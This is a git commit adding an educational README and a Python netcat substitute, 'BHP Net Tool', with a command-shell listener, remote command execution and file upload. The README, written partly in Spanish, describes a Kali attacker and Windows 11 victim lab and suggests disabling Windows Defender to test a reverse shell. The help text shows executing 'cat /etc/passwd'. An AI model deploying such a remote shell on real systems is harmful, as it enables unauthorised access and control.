51df8658dbec64deab5b53fac9730e02c39bca74
IML15 <g6nhwnwjy2@privaterelay.appleid.com>
2026-04-25 13:33:46 +0200

    README.md

--- README.md
+++ README.md
@@ -1,2 +1,26 @@
 # Netcat.py
-A Netcat substitute made on python
+
+*Fecha de publicación: 30/12/2025*
+
+> [!NOTE]
+> **Iker Marín López (IML15)**
+>
+> Cybersecurity Engineer (Universidad Rey Juan Carlos)
+>
+> **Links:** 🔗 [LinkedIn](https://www.linkedin.com/in/iker-marin-lopez-90791b379/) | 🐱 [GitHub](https://github.com/IML15) | 📥 [Telegram](https://t.me/hueco44)
+
+
+This repository shows a python design which substitutes the famous application "Netcat". This practice is really interesting for users who want to introduce their shelf's into the hacking environment.
+
+
+> [!WARNING]
+> **ADVERTENCIA:** Este documento ha sido realizado con fines exclusivamente educativos en un entorno controlado. El autor no se hace responsable del mal uso de la información aquí expuesta.
+
+
+- **Sugerencia**: si no se dispone de un Rubber Ducky, también podríais desactivar el Windows defender manualmente siguiendo los pasos del [payload](#payload) (adjuntado más adelante) y probar el comando que ejecuta la Reverse Shell como práctica (así podrías verificar el funcionamiento de la Reverse Shell y estudiar el mismo).
+
+## 1. Preparación de las máquinas (Atacante y Víctima)
+
+Crearemos dos máquinas en **VMware** (en nuestro caso una Kali-Linux [atacante] y una máquina Windows11 “25H2” [víctima]) y las configuraremos de modo que las máquinas compartan la misma red en uno de sus adaptadores red (este segundo adaptador lo crearemos antes de iniciar las máquinas). En mi caso, he creado una red llamada “Red InternaIML15” que será la que usen ambas máquinas y que además será de uso privado para el host (nosotros). 
+
+
---
+++ src/netcat/netcat.py
@@ -0,0 +1,130 @@
+import argparse
+import socket
+import shlex
+import subprocess
+import sys
+import textwrap
+import threading
+
+def execute(cmd):
+    if not cmd:
+        return
+    # Uses directly the string cmd with shlex
+    output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
+    return output.decode()
+
+
+class NetCat:
+
+    def __init__(self, args, buffer=None):
+        self.args = args
+        self.buffer = buffer
+        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+
+    def run(self):
+        if self.args.listen:
+            self.listen()
+        else:
+            self.send()
+
+    def send(self):
+        self.socket.connect((self.args.target, self.args.port))
+        if self.buffer:
+            self.socket.send(self.buffer)
+
+        try:
+            while True:
+                # 1. We receive the reply or the prompt
+                data = self.socket.recv(4096)
+                if not data:
+                    break
+                # We print what we get (result/prompt)
+                # Uses end='' cause the prompt usually brings with it his owns spaces/jumps
+                print(data.decode(), end='')
+                # 2. If what we receive ends in our prompt, we request an input
+                if "BHP: #>" in data.decode():
+                    buffer = input("")  # The prompt has been sent by the server
+                    buffer += "\n"
+                    self.socket.send(buffer.encode())
+        except KeyboardInterrupt:
+            print("User terminated.")
+            self.socket.close()
+            sys.exit()
+
+    def listen(self):
+        self.socket.bind((self.args.target, self.args.port))
+        self.socket.listen(5)
+        while True:
+            client_socket, _ = self.socket.accept()
+            client_thread = threading.Thread(target=self.handle, args=(client_socket,))
+            client_thread.start()
+
+    def handle(self, client_socket):
+        if self.args.execute:
+            output = execute(self.args.execute)
+            client_socket.send(output.encode())
+
+        elif self.args.upload:
+            file_buffer = b""
+            while True:
+                data = client_socket.recv(4096)
+                if data:
+                    file_buffer += data
+                else:
+                    break
+
+            with open(self.args.upload, "wb") as f:
+                f.write(file_buffer)
+            message = f"Saved file: {self.args.upload}"
+            client_socket.send(message.encode())
+
+
+        elif self.args.command:
+
+            cmd_buffer = b""
+            while True:
+                try:
+                    client_socket.send(b"BHP: #> ")
+                    # We read until we find the '\n'
+                    while b"\n" not in cmd_buffer:
+                        data = client_socket.recv(64)
+                        if not data:  # If there isn't any data, the cliente has disconnected
+                            break
+                        cmd_buffer += data
+                    if not cmd_buffer:
+                        break
+                    response = execute(cmd_buffer.decode().strip())  # .strip() clean spaces/jumps
+                    if response:
+                        client_socket.send(response.encode())
+                    cmd_buffer = b""  # We clean for the next command
+                except Exception as e:
+                    print(f"Error handling client: {e}")
+                    break  # We just got out of this client's loop
+            client_socket.close()  # We just CLOSE this client's socket
+
+if __name__ == "__main__":
+
+    parser = argparse.ArgumentParser(description="BHP Net Tool",
+                                     formatter_class=argparse.RawDescriptionHelpFormatter,
+                                     epilog=textwrap.dedent("""Example:
+                                     netcat.py -t 192.168.1.108 -p 5555 -l -c #command shell
+                                     netcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt #upload to file
+                                     netcat.py -t 192.168.1.108 -p 5555 -l -e=\"cat /etc/passwd\" #execute command
+                                     echo "ABC" | ./netcat.py -t 192.168.1.108 -p 135 #echo text to server port 135
+                                     netcat.py -t 192.168.1.108 -p 5555 #connect to server"""))
+
+    parser.add_argument("-c", "--command", action="store_true", help="command shell")
+    parser.add_argument("-e", "--execute", help="execute specified command")
+    parser.add_argument("-l", "--listen", action="store_true", help="listen")
+    parser.add_argument("-p", "--port", type=int , default=5555, help="specified port")
+    parser.add_argument("-t", "--target", default="192.168.1.203", help="specified IP")
+    parser.add_argument("-u", "--upload", help="upload file")
+    args = parser.parse_args()
+    if args.listen:
+        buffer = ""
+    else:
+        buffer = sys.stdin.read()
+
+    nc = NetCat(args, buffer.encode())
+    nc.run()
